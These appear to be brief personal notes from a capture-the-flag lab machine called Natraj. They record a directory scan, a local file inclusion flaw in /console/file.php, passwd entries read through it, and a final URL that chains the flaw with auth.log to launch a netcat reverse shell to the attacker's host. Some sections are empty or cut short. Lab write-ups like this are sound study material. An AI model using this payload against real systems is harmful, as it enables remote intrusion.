# Natraj

![[Pasted image 20220520210413.png]]

```
192.168.1.198
```


## Port scan

```

```

dirbuster found /console/ which has file.php in it.

/console/file.php has an LFI vulnerability.

![[Pasted image 20220527231815.png]]

two of the users have interactive bash at login

```
root:x:0:0:root:/root:/bin/bash
natraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash
mahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash
```

put the users into a file called users.txt

```bash
hydra -l
```

```
http://192.168.1.198/console/file.php?file=../../../../../../../var/log/auth.log&cmd=rm%20/tmp/f;mkfifo%20/tmp/f;%20cat%20/tmp/f%20|%20/bin/sh%20-i%202%3E&1%20|%20nc%20192.168.1.112%209999%20%3E%20/tmp/f
```